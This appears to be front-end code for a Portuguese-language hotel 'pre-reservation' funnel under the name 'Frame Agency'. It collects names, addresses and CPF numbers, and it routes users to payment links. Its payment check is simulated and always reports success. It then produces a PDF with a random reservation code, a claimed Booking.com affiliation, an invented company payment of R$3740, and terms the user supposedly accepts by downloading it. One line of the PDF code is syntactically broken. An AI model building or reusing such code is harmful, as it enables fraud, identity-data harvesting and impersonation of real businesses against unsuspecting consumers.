...
.city-select input::before {
  content: '';
  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>') center / 24px;
  position: absolute;
  left: 16px;
  top: 50%;
...
.pre-reserva-container {
  text-align: center;
  padding: 24px;
}
.pre-reserva-container h2 {
  margin-bottom: 16px;
}
.pre-reserva-container button {
  margin-top: 16px;
}
`;
...
document.body.innerHTML = `
  <div class="container" style="opacity: 0; animation: fadeIn 0.8s ease forwards;">
    ...
    <div id="step5" class="step">
      <h2>Selecione sua hospedagem</h2>
      <div class="comunicado-card">
        ...
        <div class="hotel-actions">
          <div class="details-link" onclick="document.getElementById('city-input').focus()">Buscar cidade <svg width="16" height="16" fill="var(--primary-color)"><path d="M4 9h8l-4-4-4 4"/></svg></div>
        </div>
      </div>
    ...
    <div id="pre-reserva" class="step pre-reserva-container">
      <lottie-player src="https://lottie.host/a11872ae-9848-45ba-8871-fa870929372e/YWZlUTBnMU.lottie" background="transparent" speed="1" style="width: 140px; height: 140px; margin: 0 auto;" loop autoplay></lottie-player>
      <h2 id="pre-reserva-title"></h2>
      ...
      <button class="btn" id="continue-to-verification" style="display: none;">Continuar</button>
    </div>
  ...
  <div class="date-fullscreen" id="date-fullscreen">
    <div class="progress-bar"><div class="progress-fill"></div></div>
    <h2>Selecione a data da experiência</h2>
  ...
  <div class="premium-overlay" id="premium-overlay">
    <div class="premium-content">
      ...
      <h3>Identificamos sua assinatura Premium.</h3>
      <p>Por ser um usuário Premium, você conta com hospedagem inclusa no seu agendamento</p>
      <p>Deseja aproveitar esta oferta?</p>
      <button class="btn btn-primary" id="accept-offer">Sim, seguir com a oferta</button>
      <div class="btn-secondary" id="decline-offer">Seguir sem a oferta</div>
    </div>
  </div>
...
function showStep(step) {
  ...
  if (step === 'pre-reserva') {
    document.getElementById('pre-reserva-title').textContent = `${userData.personal.nome}, estamos quase finalizando!`;
  }
}
...
function validateStep(step) {
  ...
  if (step === 1) {
    ...
    if (!nome || nome.split(' ').length < 2 || nome.length > 100) {
      showError('nome', 'Por favor, insira seu nome completo (máx. 100 caracteres).');
      valid = false;
    }
    ...
    if (!rua || rua.length > 100) {
      showError('rua', 'Informe sua rua (máx. 100 caracteres).');
      valid = false;
    }
    if (!bairro || bairro.length > 100) {
      showError('bairro', 'Informe seu bairro (máx. 100 caracteres).');
      valid = false;
    }
    if (!numero) {
    ...
    if (!cidade || cidade.length > 100) {
      showError('cidade', 'Informe sua cidade (máx. 100 caracteres).');
      valid = false;
    }
    if (!estado) {
    ...
    if (!displayName || displayName.length > 100) {
      showError('displayName', 'Campo obrigatório (máx. 100 caracteres).');
      valid = false;
    }
    if (!showAge) {
...
confirmBtn.addEventListener('click', () => {
  ...
  if (upsellTotal === 470) link = 'https://app.pushinpay.com.br/service/pay/A03FD477-AB8F-4223-9EED-A6C23F95CC5D';
    ...
    showStep('pre-reserva');
    return;
  }
  document.getElementById('payment-popup').style.display = 'block';
  document.getElementById('overlay-black').style.display = 'block';
  document.getElementById('go-payment').onclick = () => {
    const goBtn = document.getElementById('go-payment');
    const text = goBtn.textContent;
    goBtn.textContent = 'Redirecionando…';
    const spinner = document.createElement('div');
    spinner.className = 'spinner';
    spinner.style.position = 'absolute';
    spinner.style.left = '50%';
  ...
  document.getElementById('payment-done').onclick = () => {
    ...
    showLoadingOverlay(['Verificando pagamento…', 'Tudo certo!'], () => showStep('pre-reserva'));
  };
});
...
document.addEventListener('DOMContentLoaded', () => {
  ...
  const sensitiveInputs = ['nome', 'rua', 'bairro', 'cidade', 'displayName'];
  sensitiveInputs.forEach(id => {
    const input = document.getElementById(id);
    input.addEventListener('input', () => {
      let val = input.value.replace(/[^a-zA-Z0-9\s]/g, '');
  ...
  tooltip.textContent = 'Dados corretos garantem a não reprovação do agendamento';
  cpfInput.parentElement.appendChild(tooltip);
  cpfInput.addEventListener('focus', () => tooltip.style.display = 'block');
  cpfInput.addEventListener('blur', () => tooltip.style.display = 'none');
  nomeInput.addEventListener('focus', () => tooltip.style.display = 'block');
  nomeInput.addEventListener('blur', () => tooltip.style.display = 'none');
  displayNameInput.addEventListener('focus', () => tooltip.style.display = 'block');
  displayNameInput.addEventListener('blur', () => tooltip.style.display = 'none');
  document.getElementById('download-pre-reserva').addEventListener('click', generatePDF);
  document.getElementById('continue-to-verification').addEventListener('click', () => showStep(7));
...
function generatePDF() {
  ...
  const downloadDate = emissionDate.replace(/\//g, '');
  const randomCode = Math.floor(100000 + Math.random() * 900000);
  const reservaCode = `F-${randomCode}-${downloadDate}`;
  ...
  const checkIn = checkInDate.toLocaleDateString('pt-BR', {day: '2-digit', month: '2-digit', year: 'numeric'});
  const checkOut = checkOutDate.toLocaleDateString('pt-BR', {day: '2-digit', month: '2-digit', year: 'numeric'});
  const paymentDate = today.toLocaleDateString('pt-BR', {day: 'numeric', month: 'long', year: 'numeric'});
  doc.addImage('https://framerusercontent.com/images/2q0L5VgbcB1j70YVtdptjLfg08A.png', 'PNG', 140, 10, 50, 20);
  doc.setFontSize(16);
  doc.text('Pré Reserva - Frame Agency', 20, 20);
  doc.setFontSize(10);
  doc.text(`Número da reserva: ${reservaCode}`, 20, 30);
  doc.text(`Data de emissão: ${emissionDate}`, 20, 35);
  doc.text('Frame Tecnologia LTDA', 20, 45);
  doc.text('CNPJ - 38.539.493/0001-05', 20, 50);
  doc.text('Av Brigadeiro Faria Lima', 20, 55);
  doc.text('São Paulo - São Paulo, Brasil', 20, 60);
  doc.text('contato@frameag.com', 20, 65);
  doc.text(`Serviço Hoster de Pré Reserva Frame Tecnologia LTDA`, 20, 75);
  doc.text(`by Booking.com Brasil Servicos de Reserva de Hoteis LTDA`, 20, 80);
  doc.text(`${checkIn} – ${checkOut}.`, 20, 85);
  doc.text(reservaCode, 20, 95);
  doc.text('Subtotal', 20, 105);
  doc.text('R$ 3740,00', 160, 105);
  doc.text('Desconto Partner', 20, 110);
  doc.text('R$ 3740,00', 160, 110);
  doc.text('Valor devido pelo cliente', 20, 115);
  doc.text('R$ 0,00', 160, 115);
  doc.text(`R$ 3740,00 pagos pela empresa em ${paymentDate}.`, 20, 120);
  doc.text('Emitida para:', 20, 130);
  doc.text(nome, 20, 135);
  doc.text(cpf, 20, 140);
  doc.text(endereco, 20, 145);
  doc.text('Adicione', 20, 155);
  doc.text('1 estádia', 20, 160);
  doc.text('2 hóspedes', 20, 165);
  doc.setTextColor('#9A7A56');
  doc.textWithLink('Acessar portal do cliente', 20, 170, { url: 'https://frameag.com/login' });
  doc.setTextColor(0);
  doc.text('Olá! Essa é uma confirmação da sua Pré Reserva para o serviço de hospedagem da Frame Agency.', 20, 180);
  doc.text('Status e Condições:', 20, 190);
  doc.text('Esta reserva é uma Pré-Reserva e está sujeita à verificação interna da Frame Tecnologia LTDA, incluindo a validação', 20, 195);
  doc.text('de identidade e documentos. A efetivação final da reserva depende da aprovação integral após esta verificação.', 20, 200);
  doc.text('Oferecemos um suporte 24h todos os dias. Fale conosco em:', 20, 210);
  doc.setTextColor('#9A7A56');
  doc.textWithLink('www.frameag.com/contato.', 20, 215, { url: 'https://frameag.com/contato' });
  doc.setTextColor(0);
  doc.text('Ou no chat de atendimento no Telegram:', 20, 220);
  doc.setTextColor('#9A7A56');
  doc.textWithLink('https://t.me/suporteframebot?start=fatura-mail', 20, 225, { url: 'https://t.me/suporteframebot?start=fatura-mail' });
  doc.setTextColor(0);
  doc.text('Atenciosamente,', 20, 235);
  doc.text('Frame Tecnologia LTDA.', 20, 240);
  doc.text('Cancelamento:', 20, 250);
  doc.text('A Frame Tecnologia LTDA se reserva o direito de cancelar unilateralmente esta Pré-Reserva a qualquer momento,', 20, 255);
  doc.text('caso as condições e verificações não sejam atendidas, ou por motivos internos da empresa. O cancelamento não', 20, 260);
  doc.text('gerará ônus ou responsabilidade adicional para a Frame, exceto pela devolução de valores, se aplicável.', 20, 265);
  doc.text('Termos e Condições:', 20, 275);
  doc.text('Ao baixar e/ou possuir este documento, o Usuário citado neste PDF declara ter lido e concordado integralmente com', 20, 280);
  doc.text('os Termos e Condições Gerais disponíveis em', 20, 285);
  doc.setTextColor('#9A7A56');
  doc.textWithLink([](https://frameag.com/termos)', 20, 290, { url: 'https://frameag.com/termos' });
  doc.setTextColor(0);
  doc.text(', bem como os Termos do contrato', 95, 290);
  doc.text('assinado digitalmente antes da emissão deste arquivo.', 20, 295);
  doc.save(`Pre-Reserva-Frame-${nome}.pdf`);
  showToast('Sua Pré-Reserva foi gerada com sucesso.');
  document.getElementById('continue-to-verification').style.display = 'block';
}
updateProgress();